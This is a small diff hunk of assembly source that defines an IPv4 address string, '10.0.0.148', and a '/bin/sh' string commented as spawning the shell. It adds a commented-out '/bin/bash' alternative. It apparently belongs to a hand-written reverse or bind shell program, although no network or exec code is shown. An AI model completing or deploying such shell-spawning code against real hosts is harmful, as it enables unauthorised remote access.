@@ -4,6 +4,7 @@
         .string "10.0.0.148" ; ipv4
 .LC1:
         .string "/bin/sh"    ; spawnar o sh
+        ;.string "/bin/bash"
 main:
         push    rbp
         mov     rbp, rsp
